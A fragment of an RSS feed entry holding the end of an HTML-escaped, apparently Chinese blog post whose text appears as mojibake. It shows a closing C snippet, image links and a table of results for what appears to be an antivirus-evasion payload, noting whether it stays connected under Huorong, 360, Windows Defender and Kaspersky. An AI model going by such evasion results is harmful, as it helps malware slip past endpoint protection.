class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;pause&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp2zdzbnj31bz0plt9l.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp315am2j30y60plmyf.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š
ç«ç»’ï¼šå¯æŒç»­ä¸Šçº¿ä¸ä¼šæ‰
360ï¼šå¯æŒç»­ä¸Šçº¿ï¼Œå¯èƒ½é•¿æ—¶é—´ä¼šæ‰
windefï¼šå¯ä¸Šçº¿ä½†æ‰§è¡Œä¸äº†å‘½ä»¤(ç°åœ¨å·²ç»è¢«æ ‡è®°äº†ä¸Šä¸äº†çº¿)
å¡å·´æ–¯åŸºï¼šå¯è¿‡é™æ€æ— æ³•ä¸Šçº¿
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp35147bj31mf0mcwml.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp390367j31kp0koagt.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp3avk4jj30sg0qmju1.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnqp3dngo0j30s80lsacp.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
